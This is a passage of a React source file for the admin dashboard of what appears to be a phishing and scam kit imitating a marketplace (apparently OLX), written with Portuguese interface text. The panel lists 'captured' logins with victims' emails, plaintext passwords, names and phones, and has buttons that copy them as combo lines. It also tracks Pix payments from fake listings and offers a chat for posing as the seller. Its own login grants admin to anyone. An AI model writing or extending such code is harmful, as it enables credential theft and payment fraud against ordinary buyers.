import { createFileRoute, useNavigate, Link, Outlet, useLocation, useRouter } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  LayoutDashboard, Package, Users, LogOut, Plus, Search, Edit3, Trash2,
  Eye, EyeOff, Star, TrendingUp, ShoppingBag, DollarSign, Copy, Check,
  ExternalLink, Filter, ChevronRight, MessageCircle, Send, ArrowLeft, Menu, X,
  CreditCard, Clock, CheckCircle2, XCircle, UserCog,
} from "lucide-react";
import { AdminChat } from "@/components/AdminChat";
import { GatewaysPanel } from "@/components/GatewaysPanel";
import { UsersPanel } from "@/components/UsersPanel";
import { Wallet } from "lucide-react";

function AdminErrorBoundary({ error, reset }: { error: Error; reset: () => void }) {
  // Log com stack para aparecer nos logs do console e nos logs do worker
  // eslint-disable-next-line no-console
  console.error("[admin] erro renderizando painel:", error);
  const router = useRouter();
  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-6">
      <div className="max-w-md w-full bg-slate-900 border border-slate-800 rounded-2xl p-6 text-center">
        <h2 className="text-lg font-bold mb-2">Algo travou ao abrir esta aba</h2>
        <p className="text-sm text-slate-400 mb-4 break-words">{error?.message ?? "Erro desconhecido"}</p>
        <div className="flex gap-2 justify-center">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="bg-purple-600 hover:bg-purple-500 text-white text-sm font-semibold px-4 py-2 rounded-lg"
          >
            Tentar novamente
          </button>
          <a
            href="/admin"
            className="bg-slate-800 hover:bg-slate-700 text-slate-200 text-sm font-semibold px-4 py-2 rounded-lg"
          >
            Recarregar painel
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createFileRoute("/admin")({
  component: AdminHome,
  errorComponent: AdminErrorBoundary,
});

type Listing = {
  id: string; slug: string; title: string; price_cents: number;
  carousel_section: string; is_main: boolean; published: boolean;
  thumb?: string;
};
type Lead = { id: string; created_at: string; email: string; password_attempt: string; listing_id: string | null; user_agent: string | null; full_name: string | null; phone: string | null };
type Pix = {
  id: string; transaction_id: string; status: string; amount_cents: number;
  payer_name: string | null; payer_document: string | null; payer_email: string | null;
  listing_id: string | null; created_at: string; paid_at: string | null;
};

function AdminHome() {
  const navigate = useNavigate();
  const location = useLocation();
  const [authed, setAuthed] = useState<boolean | null>(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [tab, setTab] = useState<"dashboard" | "anuncios" | "leads" | "chat" | "vendas" | "gateways" | "usuarios">("dashboard");
  const [listings, setListings] = useState<Listing[]>([]);
  const [leads, setLeads] = useState<Lead[]>([]);
  const [pixes, setPixes] = useState<Pix[]>([]);
  const [search, setSearch] = useState("");
  const [sectionFilter, setSectionFilter] = useState<string>("all");
  const [copied, setCopied] = useState<string | null>(null);
  const [email, setEmail] = useState("");
  const [pwd, setPwd] = useState("");
  const [err, setErr] = useState("");
  const [authLoading, setAuthLoading] = useState(false);
  const [navOpen, setNavOpen] = useState(false);

  useEffect(() => {
    const check = async (session: any) => {
      let fake = false;
      try { fake = localStorage.getItem("olx_admin_authed") === "1"; } catch {}
      if (!session && !fake) { setIsAdmin(false); setAuthed(false); return; }
      setIsAdmin(true);
      setAuthed(true);
    };
    supabase.auth.getSession().then(({ data }) => check(data.session));
    const { data: sub } = supabase.auth.onAuthStateChange((_e, s) => { setTimeout(() => check(s), 0); });
    const onStorage = () => check(null);
    window.addEventListener("storage", onStorage);
    return () => { sub.subscription.unsubscribe(); window.removeEventListener("storage", onStorage); };
  }, []);

  const loadListings = async () => {
    const { data } = await supabase
      .from("listings").select("id,slug,title,price_cents,carousel_section,is_main,published")
      .order("display_order");
    const items = (data ?? []) as Listing[];
    if (items.length) {
      const ids = items.map(i => i.id);
      const { data: imgs } = await supabase
        .from("listing_images").select("listing_id,url,display_order")
        .in("listing_id", ids).order("display_order");
      const byId: Record<string, string> = {};
      (imgs ?? []).forEach((img: any) => { if (!byId[img.listing_id]) byId[img.listing_id] = img.url; });
      items.forEach(i => { i.thumb = byId[i.id]; });
    }
    setListings(items);
  };
  const loadLeads = () => supabase
    .from("captured_leads").select("*").order("created_at", { ascending: false })
    .then(({ data }) => setLeads((data ?? []) as Lead[]));

  const loadPixes = () => supabase
    .from("pix_payments").select("*").order("created_at", { ascending: false }).limit(200)
    .then(({ data }) => setPixes((data ?? []) as Pix[]));

  useEffect(() => {
    if (!authed || !isAdmin) return;
    loadListings(); loadLeads(); loadPixes();
    const ch = supabase
      .channel("admin-rt")
      .on("postgres_changes", { event: "*", schema: "public", table: "listings" }, () => loadListings())
      .on("postgres_changes", { event: "*", schema: "public", table: "listing_images" }, () => loadListings())
      .on("postgres_changes", { event: "*", schema: "public", table: "captured_leads" }, () => loadLeads())
      .on("postgres_changes", { event: "*", schema: "public", table: "pix_payments" }, () => loadPixes())
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [authed, isAdmin]);

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault(); setErr(""); setAuthLoading(true);
    try { await supabase.auth.signInWithPassword({ email, password: pwd }); } catch {}
    try { localStorage.setItem("olx_admin_authed", "1"); } catch {}
    setIsAdmin(true); setAuthed(true); setAuthLoading(false);
  };

  const doSignOut = async () => {
    try { localStorage.removeItem("olx_admin_authed"); } catch {}
    try { await supabase.auth.signOut(); } catch {}
    setIsAdmin(false); setAuthed(false);
  };

  const remove = async (id: string) => {
    if (!confirm("Excluir este anúncio? Esta ação não pode ser desfeita.")) return;
    await supabase.from("listings").delete().eq("id", id);
  };

  const togglePublished = async (l: Listing) => {
    await supabase.from("listings").update({ published: !l.published }).eq("id", l.id);
  };

  const copyText = async (text: string, key: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  const filtered = useMemo(() => {
    return listings.filter(l => {
      if (sectionFilter !== "all" && l.carousel_section !== sectionFilter) return false;
      if (search && !l.title.toLowerCase().includes(search.toLowerCase()) && !l.slug.toLowerCase().includes(search.toLowerCase())) return false;
      return true;
    });
  }, [listings, search, sectionFilter]);

  const stats = useMemo(() => {
    const today = new Date(); today.setHours(0, 0, 0, 0);
    const leadsToday = leads.filter(l => new Date(l.created_at) >= today).length;
    const totalValue = listings.reduce((s, l) => s + l.price_cents, 0) / 100;
    const isPaid = (s: string) => ["PAID", "APPROVED", "CONFIRMED"].includes(s);
    const paid = pixes.filter(p => isPaid(p.status));
    const pending = pixes.filter(p => p.status === "PENDING");
    const revenueCents = paid.reduce((s, p) => s + p.amount_cents, 0);
    const revenueTodayCents = paid.filter(p => p.paid_at && new Date(p.paid_at) >= today).reduce((s, p) => s + p.amount_cents, 0);
    return {
      anuncios: listings.length,
      publicados: listings.filter(l => l.published).length,
      leadsTotal: leads.length,
      leadsToday,
      catalogo: totalValue,
      vendas: paid.length,
      pendentes: pending.length,
      receita: revenueCents / 100,
      receitaHoje: revenueTodayCents / 100,
    };
  }, [listings, leads, pixes]);

  if (authed === null) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center">
        <div className="text-slate-400 text-sm">Carregando painel...</div>
      </div>
    );
  }

  if (!authed) return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-purple-950 to-slate-950 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-gradient-to-br from-purple-500 to-pink-500 shadow-lg shadow-purple-500/30 mb-4">
            <LayoutDashboard className="text-white" size={26} />
          </div>
          <h1 className="text-2xl font-bold text-white">Painel administrativo</h1>
          <p className="text-sm text-slate-400 mt-1">Entre para gerenciar seu catálogo</p>
        </div>
        <form onSubmit={handleAuth} className="bg-slate-900/70 backdrop-blur border border-slate-800 p-6 rounded-2xl shadow-2xl space-y-4">
          <div>
            <label className="text-xs font-semibold text-slate-300 mb-1.5 block">E-mail</label>
            <input type="email" value={email} onChange={e => setEmail(e.target.value)} required
              className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2.5 text-white placeholder-slate-500 focus:border-purple-500 focus:outline-none transition" placeholder="seu@email.com" />
          </div>
          <div>
            <label className="text-xs font-semibold text-slate-300 mb-1.5 block">Senha</label>
            <input type="password" value={pwd} onChange={e => setPwd(e.target.value)} required minLength={6}
              className="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2.5 text-white placeholder-slate-500 focus:border-purple-500 focus:outline-none transition" placeholder="••••••••" />
          </div>
          {err && <div className="bg-red-500/10 border border-red-500/30 text-red-400 text-sm p-2.5 rounded-lg">{err}</div>}
          <button type="submit" disabled={authLoading}
            className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-2.5 rounded-lg transition shadow-lg shadow-purple-500/20 disabled:opacity-60">
            {authLoading ? "Entrando..." : "Entrar"}
          </button>
        </form>
      </div>
    </div>
  );

  if (!isAdmin) return (
    <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 max-w-sm text-center">
        <p className="text-white mb-4">Sua conta não tem permissão de administrador.</p>
        <button onClick={doSignOut} className="text-purple-400 underline text-sm">Sair</button>
      </div>
    </div>
  );

  if (location.pathname !== "/admin") return <Outlet />;

  const NavBtn = ({ id, icon: Icon, label, count }: any) => (
    <button onClick={() => { setTab(id); setNavOpen(false); }}
      className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition ${
        tab === id ? "bg-purple-500/15 text-purple-300 border border-purple-500/30" : "text-slate-400 hover:text-white hover:bg-slate-800/60 border border-transparent"
      }`}>
      <Icon size={18} />
      <span className="flex-1 text-left">{label}</span>
      {count !== undefined && (
        <span className={`text-xs px-2 py-0.5 rounded-full ${tab === id ? "bg-purple-500/30 text-purple-200" : "bg-slate-800 text-slate-400"}`}>{count}</span>
      )}
    </button>
  );

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 lg:flex">
      {/* Mobile top bar */}
      <div className="lg:hidden sticky top-0 z-30 bg-slate-900/95 backdrop-blur border-b border-slate-800 px-4 py-3 flex items-center gap-3">
        <button onClick={() => setNavOpen(true)} className="p-1.5 rounded-md hover:bg-slate-800 text-slate-300">
          <Menu size={20} />
        </button>
        <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center">
          <LayoutDashboard className="text-white" size={16} />
        </div>
        <p className="text-sm font-bold flex-1 truncate">Admin Panel</p>
        <span className="flex items-center gap-1.5 text-[10px] text-slate-400">
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> Live
        </span>
      </div>

      {/* Mobile drawer overlay */}
      {navOpen && (
        <div className="lg:hidden fixed inset-0 z-40 bg-black/60" onClick={() => setNavOpen(false)} />
      )}

      {/* Sidebar */}
      <aside className={`w-64 border-r border-slate-800 bg-slate-900 flex flex-col fixed inset-y-0 left-0 z-50 transition-transform lg:translate-x-0 ${navOpen ? "translate-x-0" : "-translate-x-full lg:translate-x-0"}`}>
        <div className="p-5 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center shadow-lg shadow-purple-500/30">
              <LayoutDashboard className="text-white" size={18} />
            </div>
            <div>
              <p className="text-sm font-bold">Admin Panel</p>
              <p className="text-[10px] text-slate-500 uppercase tracking-wider">Marketplace</p>
            </div>
          </div>
          <button onClick={() => setNavOpen(false)} className="lg:hidden text-slate-400 p-1">
            <X size={18} />
          </button>
        </div>
        <nav className="p-3 space-y-1 flex-1 overflow-y-auto">
          <NavBtn id="dashboard" icon={LayoutDashboard} label="Dashboard" />
          <NavBtn id="vendas" icon={CreditCard} label="Vendas" count={pixes.length} />
          <NavBtn id="chat" icon={MessageCircle} label="Chat ao vivo" />
          <NavBtn id="anuncios" icon={Package} label="Anúncios" count={listings.length} />
          <NavBtn id="leads" icon={Users} label="Leads" />
          <NavBtn id="usuarios" icon={UserCog} label="Usuários" />
          <NavBtn id="gateways" icon={Wallet} label="Gateways" />
        </nav>
        <div className="p-3 border-t border-slate-800 space-y-1">
          <Link to="/" target="_blank" className="w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:text-white hover:bg-slate-800/60 transition">
            <ExternalLink size={18} /> Ver site
          </Link>
          <button onClick={doSignOut}
            className="w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:text-red-400 hover:bg-red-500/10 transition">
            <LogOut size={18} /> Sair
          </button>
        </div>
      </aside>

      {/* Main */}
      <main className="flex-1 lg:ml-64 p-4 sm:p-6 lg:p-8 max-w-[1400px] w-full">
        <header className="hidden lg:flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold tracking-tight">
              {tab === "dashboard" && "Dashboard"}
              {tab === "vendas" && "Vendas"}
              {tab === "chat" && "Chat ao vivo"}
              {tab === "anuncios" && "Anúncios"}
              {tab === "leads" && "Leads capturados"}
              {tab === "gateways" && "Gateways de pagamento"}
              {tab === "usuarios" && "Usuários"}
            </h1>
            <p className="text-sm text-slate-500 mt-1">
              {tab === "dashboard" && "Visão geral do seu marketplace em tempo real"}
              {tab === "vendas" && "Todas as transações Pix em tempo real"}
              {tab === "chat" && "Responda visitantes em tempo real como o vendedor"}
              {tab === "anuncios" && "Gerencie produtos, preços e seções"}
              {tab === "leads" && "Todos os logins capturados, atualizados ao vivo"}
              {tab === "gateways" && "Cadastre suas chaves e troque de gateway com 1 clique"}
              {tab === "usuarios" && "Crie e gerencie usuários e administradores"}
            </p>
          </div>
          <div className="flex items-center gap-2 text-xs text-slate-500">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            Realtime ativo
          </div>
        </header>
        <div className="lg:hidden mb-4">
          <h1 className="text-xl font-bold tracking-tight">
            {tab === "dashboard" && "Dashboard"}
            {tab === "vendas" && "Vendas"}
            {tab === "chat" && "Chat ao vivo"}
            {tab === "anuncios" && "Anúncios"}
            {tab === "leads" && "Leads capturados"}
            {tab === "gateways" && "Gateways"}
            {tab === "usuarios" && "Usuários"}
          </h1>
        </div>

        <section className={tab === "dashboard" ? "space-y-6" : "hidden"} aria-hidden={tab !== "dashboard"}>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4">
              <StatCard icon={DollarSign} label="Receita total" value={`R$ ${stats.receita.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`} hint={`R$ ${stats.receitaHoje.toLocaleString("pt-BR", { minimumFractionDigits: 2 })} hoje`} color="from-emerald-500 to-green-500" />
              <StatCard icon={CheckCircle2} label="Vendas pagas" value={stats.vendas} hint={`${stats.pendentes} pendentes`} color="from-purple-500 to-pink-500" />
              <StatCard icon={Package} label="Anúncios" value={stats.anuncios} hint={`${stats.publicados} publicados`} color="from-blue-500 to-cyan-500" />
              <StatCard icon={TrendingUp} label="Soma do catálogo" value={`R$ ${stats.catalogo.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`} hint={stats.anuncios > 0 ? `Média R$ ${(stats.catalogo / stats.anuncios).toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : "Sem anúncios"} color="from-indigo-500 to-violet-500" />
              <StatCard icon={Users} label="Leads" value={stats.leadsTotal} hint={`+${stats.leadsToday} hoje`} color="from-amber-500 to-orange-500" />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Panel title="Vendas recentes" action={<button onClick={() => setTab("vendas")} className="text-xs text-purple-400 hover:text-purple-300 flex items-center gap-1">Ver todas <ChevronRight size={14} /></button>}>
                {pixes.slice(0, 5).map(p => (
                  <div key={p.id} className="flex items-center justify-between py-2.5 border-b border-slate-800 last:border-0 gap-3">
                    <div className="min-w-0 flex-1">
                      <p className="text-sm font-medium truncate">{p.payer_name ?? "Comprador"}</p>
                      <p className="text-xs text-slate-500">{new Date(p.created_at).toLocaleString("pt-BR")}</p>
                    </div>
                    <PixStatusBadge status={p.status} />
                    <span className="text-sm font-bold text-emerald-400 shrink-0">R$ {(p.amount_cents/100).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
                  </div>
                ))}
                {pixes.length === 0 && <p className="text-sm text-slate-500 text-center py-6">Nenhuma transação ainda</p>}
              </Panel>

              <Panel title="Leads recentes" action={<button onClick={() => setTab("leads")} className="text-xs text-purple-400 hover:text-purple-300 flex items-center gap-1">Ver todos <ChevronRight size={14} /></button>}>
                {leads.slice(0, 5).map(l => (
                  <div key={l.id} className="flex items-center justify-between py-2.5 border-b border-slate-800 last:border-0">
                    <div className="min-w-0 flex-1">
                      <p className="text-sm font-medium truncate">{l.email}</p>
                      <p className="text-xs text-slate-500">{new Date(l.created_at).toLocaleString("pt-BR")}</p>
                    </div>
                    <span className="text-xs font-mono bg-slate-800 px-2 py-1 rounded">{l.password_attempt}</span>
                  </div>
                ))}
                {leads.length === 0 && <p className="text-sm text-slate-500 text-center py-6">Nenhum lead ainda</p>}
              </Panel>
            </div>
        </section>

        <section className={tab === "vendas" ? "block" : "hidden"} aria-hidden={tab !== "vendas"}>
          <VendasTab pixes={pixes} listings={listings} stats={stats} copyText={copyText} copied={copied} />
        </section>

        <section className={tab === "anuncios" ? "space-y-4" : "hidden"} aria-hidden={tab !== "anuncios"}>
            <div className="flex flex-wrap gap-3 items-center justify-between">
              <div className="flex gap-2 flex-1 min-w-[280px]">
                <div className="relative flex-1 max-w-md">
                  <Search size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
                  <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Buscar por título ou slug..."
                    className="w-full bg-slate-900 border border-slate-800 rounded-lg pl-9 pr-3 py-2 text-sm text-white placeholder-slate-500 focus:border-purple-500 focus:outline-none" />
                </div>
                <div className="relative">
                  <Filter size={14} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-slate-500 pointer-events-none" />
                  <select value={sectionFilter} onChange={e => setSectionFilter(e.target.value)}
                    className="bg-slate-900 border border-slate-800 rounded-lg pl-7 pr-7 py-2 text-sm text-white focus:border-purple-500 focus:outline-none appearance-none">
                    <option value="all">Todas as seções</option>
                    <option value="main">Principal</option>
                    <option value="tambem">Também podem te interessar</option>
                    <option value="mais">Mais procurados</option>
                  </select>
                </div>
              </div>
              <button onClick={() => navigate({ to: "/admin/anuncio/$id", params: { id: "novo" } })}
                className="flex items-center gap-2 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-semibold px-4 py-2 rounded-lg shadow-lg shadow-purple-500/20 transition">
                <Plus size={16} /> Novo anúncio
              </button>
            </div>

            {/* Desktop table */}
            <div className="hidden md:block bg-slate-900 border border-slate-800 rounded-xl overflow-x-auto">
              <table className="w-full text-sm min-w-[640px]">
                <thead className="bg-slate-900/50 text-xs uppercase tracking-wider text-slate-500 border-b border-slate-800">
                  <tr>
                    <th className="text-left font-semibold p-3">Anúncio</th>
                    <th className="text-left font-semibold p-3">Seção</th>
                    <th className="text-right font-semibold p-3">Preço</th>
                    <th className="text-center font-semibold p-3">Status</th>
                    <th className="text-right font-semibold p-3">Ações</th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map(l => (
                    <tr key={l.id} className="border-b border-slate-800 last:border-0 hover:bg-slate-800/30 transition">
                      <td className="p-3">
                        <div className="flex items-center gap-3">
                          {l.thumb ? (
                            <img src={l.thumb} alt={l.title} className="w-12 h-12 rounded-lg object-cover border border-slate-700 shrink-0 bg-slate-800" loading="lazy" />
                          ) : (
                            <div className="w-12 h-12 rounded-lg bg-slate-800 border border-slate-700 flex items-center justify-center shrink-0 text-slate-600">
                              <ShoppingBag size={16} />
                            </div>
                          )}
                          {l.is_main && <span className="text-amber-400 shrink-0" title="Principal"><Star size={14} fill="currentColor" /></span>}
                          <div className="min-w-0">
                            <p className="font-medium truncate">{l.title}</p>
                            <button onClick={() => copyText(`${window.location.origin}/anuncio/${l.slug}`, l.id)}
                              className="text-xs text-slate-500 hover:text-purple-400 flex items-center gap-1 mt-0.5">
                              /anuncio/{l.slug}
                              {copied === l.id ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                            </button>
                          </div>
                        </div>
                      </td>
                      <td className="p-3">
                        <span className="text-xs px-2 py-1 rounded-md bg-slate-800 text-slate-300">{sectionLabel(l.carousel_section)}</span>
                      </td>
                      <td className="p-3 text-right font-bold text-emerald-400">
                        R$ {(l.price_cents/100).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
                      </td>
                      <td className="p-3 text-center">
                        <button onClick={() => togglePublished(l)}
                          className={`inline-flex items-center gap-1 text-xs px-2 py-1 rounded-md font-medium transition ${
                            l.published ? "bg-emerald-500/15 text-emerald-400 hover:bg-emerald-500/25" : "bg-slate-800 text-slate-400 hover:bg-slate-700"
                          }`}>
                          {l.published ? <><Eye size={12} /> Publicado</> : <><EyeOff size={12} /> Rascunho</>}
                        </button>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center justify-end gap-1">
                          <a href={`/anuncio/${l.slug}`} target="_blank" rel="noreferrer" title="Abrir"
                            className="p-1.5 rounded-md hover:bg-slate-800 text-slate-400 hover:text-white transition">
                            <ExternalLink size={14} />
                          </a>
                          <button onClick={() => navigate({ to: "/admin/anuncio/$id", params: { id: l.id } })} title="Editar"
                            className="p-1.5 rounded-md hover:bg-slate-800 text-slate-400 hover:text-purple-400 transition">
                            <Edit3 size={14} />
                          </button>
                          <button onClick={() => remove(l.id)} title="Excluir"
                            className="p-1.5 rounded-md hover:bg-red-500/10 text-slate-400 hover:text-red-400 transition">
                            <Trash2 size={14} />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                  {filtered.length === 0 && (
                    <tr><td colSpan={5} className="p-12 text-center text-slate-500">
                      <ShoppingBag size={32} className="mx-auto mb-2 opacity-30" />
                      Nenhum anúncio encontrado
                    </td></tr>
                  )}
                </tbody>
              </table>
            </div>

            {/* Mobile cards */}
            <div className="md:hidden space-y-3">
              {filtered.map(l => (
                <div key={l.id} className="bg-slate-900 border border-slate-800 rounded-xl p-3">
                  <div className="flex items-start gap-3 mb-2">
                    {l.thumb ? (
                      <img src={l.thumb} alt={l.title} className="w-14 h-14 rounded-lg object-cover border border-slate-700 shrink-0 bg-slate-800" loading="lazy" />
                    ) : (
                      <div className="w-14 h-14 rounded-lg bg-slate-800 border border-slate-700 flex items-center justify-center shrink-0 text-slate-600">
                        <ShoppingBag size={18} />
                      </div>
                    )}
                    <div className="min-w-0 flex-1">
                      <div className="flex items-start gap-1.5">
                        {l.is_main && <Star size={12} className="text-amber-400 shrink-0 mt-1" fill="currentColor" />}
                        <p className="font-medium text-sm leading-snug break-words">{l.title}</p>
                      </div>
                      <button onClick={() => copyText(`${window.location.origin}/anuncio/${l.slug}`, l.id)}
                        className="text-[11px] text-slate-500 hover:text-purple-400 flex items-center gap-1 mt-1 break-all text-left">
                        /anuncio/{l.slug}
                        {copied === l.id ? <Check size={11} className="text-emerald-400 shrink-0" /> : <Copy size={11} className="shrink-0" />}
                      </button>
                    </div>
                  </div>
                  <div className="flex flex-wrap items-center gap-2 mb-3">
                    <span className="text-[10px] px-2 py-1 rounded-md bg-slate-800 text-slate-300">{sectionLabel(l.carousel_section)}</span>
                    <button onClick={() => togglePublished(l)}
                      className={`inline-flex items-center gap-1 text-[10px] px-2 py-1 rounded-md font-medium transition ${
                        l.published ? "bg-emerald-500/15 text-emerald-400" : "bg-slate-800 text-slate-400"
                      }`}>
                      {l.published ? <><Eye size={11} /> Publicado</> : <><EyeOff size={11} /> Rascunho</>}
                    </button>
                    <span className="ml-auto font-bold text-emerald-400 text-sm">
                      R$ {(l.price_cents/100).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 pt-2 border-t border-slate-800">
                    <a href={`/anuncio/${l.slug}`} target="_blank" rel="noreferrer"
                      className="flex-1 flex items-center justify-center gap-1 text-xs py-2 rounded-md bg-slate-800 text-slate-300 hover:text-white">
                      <ExternalLink size={13} /> Abrir
                    </a>
                    <button onClick={() => navigate({ to: "/admin/anuncio/$id", params: { id: l.id } })}
                      className="flex-1 flex items-center justify-center gap-1 text-xs py-2 rounded-md bg-purple-500/15 text-purple-300 hover:bg-purple-500/25">
                      <Edit3 size={13} /> Editar
                    </button>
                    <button onClick={() => remove(l.id)}
                      className="flex items-center justify-center px-3 py-2 rounded-md bg-red-500/10 text-red-400 hover:bg-red-500/20">
                      <Trash2 size={13} />
                    </button>
                  </div>
                </div>
              ))}
              {filtered.length === 0 && (
                <div className="bg-slate-900 border border-slate-800 rounded-xl p-10 text-center text-slate-500">
                  <ShoppingBag size={28} className="mx-auto mb-2 opacity-30" />
                  <p className="text-sm">Nenhum anúncio encontrado</p>
                </div>
              )}
            </div>
        </section>

        <section className={tab === "leads" ? "block" : "hidden"} aria-hidden={tab !== "leads"}>
            <div className="hidden md:block bg-slate-900 border border-slate-800 rounded-xl overflow-x-auto">
              <table className="w-full text-sm min-w-[820px]">
                <thead className="bg-slate-900/50 text-xs uppercase tracking-wider text-slate-500 border-b border-slate-800">
                  <tr>
                    <th className="text-left font-semibold p-3">Quando</th>
                    <th className="text-left font-semibold p-3">Nome</th>
                    <th className="text-left font-semibold p-3">Telefone</th>
                    <th className="text-left font-semibold p-3">E-mail</th>
                    <th className="text-left font-semibold p-3">Senha</th>
                    <th className="text-left font-semibold p-3">Produto</th>
                    <th className="text-right font-semibold p-3">Ações</th>
                  </tr>
                </thead>
                <tbody>
                  {leads.map(l => {
                    const listing = listings.find(x => x.id === l.listing_id);
                    return (
                      <tr key={l.id} className="border-b border-slate-800 last:border-0 hover:bg-slate-800/30 transition">
                        <td className="p-3 text-slate-400 text-xs whitespace-nowrap">{new Date(l.created_at).toLocaleString("pt-BR")}</td>
                        <td className="p-3 text-slate-200">{l.full_name || <span className="text-slate-600">—</span>}</td>
                        <td className="p-3 text-slate-200 whitespace-nowrap">{l.phone || <span className="text-slate-600">—</span>}</td>
                        <td className="p-3 font-medium">{l.email}</td>
                        <td className="p-3">
                          <div className="flex items-center gap-2">
                            <code className="font-mono text-xs bg-slate-800 px-2 py-1 rounded text-amber-300">{l.password_attempt}</code>
                            <button onClick={() => copyText(l.password_attempt, "p-" + l.id)} className="text-slate-500 hover:text-white transition">
                              {copied === "p-" + l.id ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                            </button>
                          </div>
                        </td>
                        <td className="p-3 text-slate-400 text-xs">{listing?.title ?? "—"}</td>
                        <td className="p-3 text-right">
                          <button onClick={() => copyText(`${l.full_name ?? ""} | ${l.phone ?? ""} | ${l.email} : ${l.password_attempt}`, "c-" + l.id)}
                            className="text-xs text-purple-400 hover:text-purple-300 flex items-center gap-1 ml-auto">
                            {copied === "c-" + l.id ? <><Check size={12} /> Copiado</> : <><Copy size={12} /> Copiar</>}
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                  {leads.length === 0 && (
                    <tr><td colSpan={7} className="p-12 text-center text-slate-500">
                      <Users size={32} className="mx-auto mb-2 opacity-30" />
                      Nenhum lead capturado ainda
                    </td></tr>
                  )}
                </tbody>
              </table>
            </div>

            <div className="md:hidden space-y-3">
              {leads.map(l => {
                const listing = listings.find(x => x.id === l.listing_id);
                return (
                  <div key={l.id} className="bg-slate-900 border border-slate-800 rounded-xl p-3 space-y-2">
                    <div className="flex items-center justify-between gap-2">
                      <p className="text-[11px] text-slate-500">{new Date(l.created_at).toLocaleString("pt-BR")}</p>
                      <button onClick={() => copyText(`${l.full_name ?? ""} | ${l.phone ?? ""} | ${l.email} : ${l.password_attempt}`, "c-" + l.id)}
                        className="text-[11px] text-purple-400 hover:text-purple-300 flex items-center gap-1 shrink-0">
                        {copied === "c-" + l.id ? <><Check size={11} /> Copiado</> : <><Copy size={11} /> Copiar</>}
                      </button>
                    </div>
                    {(l.full_name || l.phone) && (
                      <div className="text-xs text-slate-300 space-y-0.5">
                        {l.full_name && <p><span className="text-slate-500">Nome:</span> {l.full_name}</p>}
                        {l.phone && <p><span className="text-slate-500">Telefone:</span> {l.phone}</p>}
                      </div>
                    )}
                    <p className="text-sm font-medium break-all">{l.email}</p>
                    <div className="flex items-center gap-2">
                      <code className="font-mono text-xs bg-slate-800 px-2 py-1 rounded text-amber-300 break-all flex-1">{l.password_attempt}</code>
                      <button onClick={() => copyText(l.password_attempt, "p-" + l.id)} className="text-slate-500 hover:text-white shrink-0">
                        {copied === "p-" + l.id ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                      </button>
                    </div>
                    {listing && <p className="text-[11px] text-slate-500 truncate">📦 {listing.title}</p>}
                  </div>
                );
              })}
              {leads.length === 0 && (
                <div className="bg-slate-900 border border-slate-800 rounded-xl p-10 text-center text-slate-500">
                  <Users size={28} className="mx-auto mb-2 opacity-30" />
                  <p className="text-sm">Nenhum lead capturado ainda</p>
                </div>
              )}
            </div>
        </section>

        <section className={tab === "chat" ? "block" : "hidden"} aria-hidden={tab !== "chat"}>
          <AdminChat listings={listings.map(l => ({ id: l.id, title: l.title }))} />
        </section>

        <section className={tab === "gateways" ? "block" : "hidden"} aria-hidden={tab !== "gateways"}>
          {tab === "gateways" && <GatewaysPanel />}
        </section>

        <section className={tab === "usuarios" ? "block" : "hidden"} aria-hidden={tab !== "usuarios"}>
          {tab === "usuarios" && <UsersPanel />}
        </section>
      </main>
    </div>
  );
}

function StatCard({ icon: Icon, label, value, hint, color }: any) {
  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 hover:border-slate-700 transition">
